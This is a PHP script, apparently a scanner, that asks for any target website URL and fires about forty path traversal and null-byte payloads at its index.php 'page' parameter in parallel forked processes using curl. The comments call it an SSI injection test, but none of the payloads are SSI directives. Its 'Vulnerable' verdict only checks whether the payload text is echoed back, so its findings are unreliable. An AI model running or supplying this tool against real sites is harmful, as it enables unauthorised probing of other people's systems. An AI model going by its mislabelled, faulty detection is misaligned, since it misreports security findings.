<?php
// Function to check for SSI injection vulnerability
function testSSIInjection($url, $payload) {
    // Construct the command with payload
    $command = "curl -X GET " . escapeshellarg($url . "/index.php?page=" . $payload);

    // Execute the command and capture output
    $output = shell_exec($command);

    // Check if the payload was successfully injected
    if (strpos($output, $payload) !== false) {
        return "\033[0;32mVulnerable\033[0m"; // Green color for vulnerable
    } else {
        return "\033[0;31mNot Vulnerable\033[0m"; // Red color for not vulnerable
    }
}

// Function to perform multithreading
function multiThreadedTest($url, $payloads) {
    $threads = array();

    // Fork multiple processes for parallel execution
    foreach ($payloads as $payload) {
        $pid = pcntl_fork();
        
        if ($pid == -1) {
            die("Failed to fork process.");
        } elseif ($pid) {
            // Parent process
            $threads[$pid] = $payload;
        } else {
            // Child process
            $result = testSSIInjection($url, $payload);
            echo "Payload: $payload - Result: $result\n";
            exit();
        }
    }

    // Wait for child processes to finish
    foreach ($threads as $pid => $payload) {
        pcntl_waitpid($pid, $status);
    }
}

// Prompt user to enter the target website URL
echo "Enter your target website URL: ";
$targetUrl = trim(fgets(STDIN));

// Define payloads to test
$payloads = array(
    "welcome.shtml", 
    "test.shtml", 
    "invalid_page", 
    "../test.shtml", 
    "../../test.shtml", 
    "../../../test.shtml",
    "../../../../test.shtml",
    "test.html%00.shtml",
    "test.html%00",
    "test.shtml%00",
    "test.html%2500.shtml",
    "test.html%2500",
    "test.shtml%2500",
    "test.html%252e%252e%252f",
    "test.shtml%252e%252e%252f",
    "test.html/.%00.shtml",
    "test.html/.%00",
    "test.shtml/.%00",
    "test.html/$",
    "test.shtml/$",
    "test.html/.",
    "test.shtml/.",
    "test.html//",
    "test.shtml//",
    "test.html/%2e%2e%2f",
    "test.shtml/%2e%2e%2f",
    "test.html/./",
    "test.shtml/./",
    "test.html/%2e%2e%2f",
    "test.shtml/%2e%2e%2f",
    "test.html/%2e%2e/",
    "test.shtml/%2e%2e/",
    "test.html/%2e%2e%5c",
    "test.shtml/%2e%2e%5c",
    "test.html/%252e%252e%255c",
    "test.shtml/%252e%252e%255c",
    "test.html/.%252e%252e%255c",
    "test.shtml/.%252e%252e%255c",
    "test.html/./.%252e%252e%255c",
    "test.shtml/./.%252e%252e%255c",
    "test.html//.%252e%252e%255c",
    "test.shtml//.%252e%252e%255c"
);

// Perform multithreaded testing
multiThreadedTest($targetUrl, $payloads);

echo "Testing completed.\n";
?>
